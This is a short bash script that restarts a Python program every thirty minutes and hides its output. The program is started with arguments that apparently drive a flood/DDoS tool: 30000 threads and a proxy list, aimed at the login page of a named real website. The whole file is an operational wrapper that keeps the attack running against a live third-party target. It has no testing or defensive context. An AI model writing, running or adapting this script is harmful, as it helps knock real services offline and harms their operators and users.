#!/bin/bash
sleep_time=1800
while :
do
  pid=`ps -aux |grep "python3 start.py null https://goii.art/#/login 1 30000 3.txt 10000 854854"|grep -v "grep" |awk '{print $2}'`
  kill -9 $pid
  nohup python3 start.py null https://goii.art/#/login 1 30000 3.txt 10000 854854 >> /dev/null 2>&1 &
  sleep $sleep_time
done
